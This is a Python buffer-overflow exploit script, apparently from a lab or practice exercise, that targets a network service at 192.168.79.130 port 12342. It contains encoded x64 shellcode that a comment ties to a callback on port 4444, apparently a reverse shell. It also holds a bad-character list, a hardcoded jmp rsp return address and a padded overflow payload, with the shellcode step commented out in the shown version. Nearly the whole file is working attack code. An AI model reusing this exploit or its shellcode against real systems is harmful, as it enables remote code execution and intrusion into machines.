import socket
import struct


s = socket.socket()
s.connect( ("192.168.79.130", 12342) )

offset = 112

buf =  b""
buf += b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d"
buf += b"\x05\xef\xff\xff\xff\x48\xbb\xe8\x94\x18\x02\xc5"
buf += b"\x9e\x4a\x3c\x48\x31\x58\x27\x48\x2d\xf8\xff\xff"
buf += b"\xff\xe2\xf4\x82\xbd\x40\x9b\xaf\x9c\x15\x56\xe9"			# ip 79.130 ve port 4444
buf += b"\xca\x17\x07\x8d\x09\x02\x85\xea\x94\x09\x5e\x05"
buf += b"\x36\x05\xbe\xb9\xdc\x91\xe4\xaf\x8e\x10\x56\xc2"
buf += b"\xcc\x17\x07\xaf\x9d\x14\x74\x17\x5a\x72\x23\x9d"
buf += b"\x91\x4f\x49\x1e\xfe\x23\x5a\x5c\xd6\xf1\x13\x8a"
buf += b"\xfd\x76\x2d\xb6\xf6\x4a\x6f\xa0\x1d\xff\x50\x92"
buf += b"\xd6\xc3\xda\xe7\x91\x18\x02\xc5\x9e\x4a\x3c"

asd = 50000 * b"A"




badchars = (
b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
#\x00 \x0a

#((1024) - (buf + offset + nop + payload)) * "C"

jmp_rsp = struct.pack('<Q',0x7FFFF7BAE577)
echo = b"echo "
buffsize = 120 * b"A"
nop = b"\x90" * 8

shellcode = buf

payload = [
	b"echo ",
	b"A" * 120,
	b"\x77\xE5\xBA\xF7\xFF\x7F\x00\x00", #7FFFF7BAE577
	#jmp_rsp,
	b'C'*4,
	b'D'*100,
	#echo,
	#buffsize,
	#nop,
	#shellcode,
	#((1024)-(len(echo)) + (len(buffsize)) + (len(nop)) + (len(shellcode))) * b"C",
	#buf

	#b"\n",
	#badchars,
	#2000 * b"C",
	#(1018-128) * b"C",
	#b"| ",

]
payload = b"".join(payload)

s.send(payload)
s.close()